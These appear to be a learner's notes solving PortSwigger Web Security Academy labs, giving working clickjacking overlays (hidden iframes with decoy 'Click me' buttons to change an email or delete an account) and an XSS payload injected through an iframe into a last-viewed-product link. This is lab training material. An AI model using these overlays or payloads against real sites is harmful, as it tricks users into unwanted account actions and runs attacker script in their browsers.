
### Lab: [Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)



```
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a6300da03f5cd56c1068024003400fe.web-security-academy.net/my-account?email=abc@hehe.com"></iframe>
```

![](../../Img_note/Pasted%20image%2020221215184000.png)

Change  opacity to 0.001 and `Test me` to `Click me`
```
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a6300da03f5cd56c1068024003400fe.web-security-academy.net/my-account?email=abc@hehe.com"></iframe>
```
![](../../Img_note/Pasted%20image%2020221215184509.png)



### Lab: [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)


	Description: This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.
	You can log in to the account yourself using the following credentials: `wiener:peter`


![](../../Img_note/Pasted%20image%2020221215184650.png)

![](../../Img_note/Pasted%20image%2020221215184705.png)

We need to make a multistep clickjacking
```
<style>
	iframe {
		position:relative;
		width:700px;
		height: 500px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:300px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:300px;
		left:200px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a900027038c73a0c009bd8e00f000c7.web-security-academy.net/my-account"></iframe>
```
![](../../Img_note/Pasted%20image%2020221215185820.png)

I will fix value:
heigth: 550px, 
top of firstClick to 500px,
opacity to 0.001

```
<style>
	iframe {
		position:relative;
		width:700px;
		height: 550px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:300px;
		left:200px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a900027038c73a0c009bd8e00f000c7.web-security-academy.net/my-account"></iframe>
```

![](../../Img_note/Pasted%20image%2020221215190436.png)





After view a product and back to home, we can see link to **Last View Product**
![](../../Img_note/Pasted%20image%2020221215193427.png)


![](../../Img_note/Pasted%20image%2020221215194532.png)
![](../../Img_note/Pasted%20image%2020221215194807.png)

So i think i will change the url at **LastViewProduct** to `"https://0a42004a04017823c0beb9800028009e.web-security-academy.net/product?productId=1&'><script>print()</script>"`


```
<iframe src="https://0a42004a04017823c0beb9800028009e.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a42004a04017823c0beb9800028009e.web-security-academy.net';window.x=1;">
```
![](../../Img_note/Pasted%20image%2020221215194324.png)

![](../../Img_note/Pasted%20image%2020221215200707.png)


